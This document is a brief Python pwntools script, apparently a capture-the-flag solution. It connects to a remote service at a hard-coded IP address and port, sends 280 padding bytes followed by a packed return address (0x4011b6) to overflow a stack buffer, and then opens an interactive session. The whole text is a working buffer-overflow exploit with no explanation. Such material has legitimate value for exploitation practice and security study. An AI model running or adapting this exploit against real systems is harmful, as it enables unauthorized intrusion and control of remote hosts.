from pwn import *
p=remote('103.229.41.18',5557)
payload = "a"*280
payload += p64(0x4011b6)
p.sendline(payload)

p.interactive()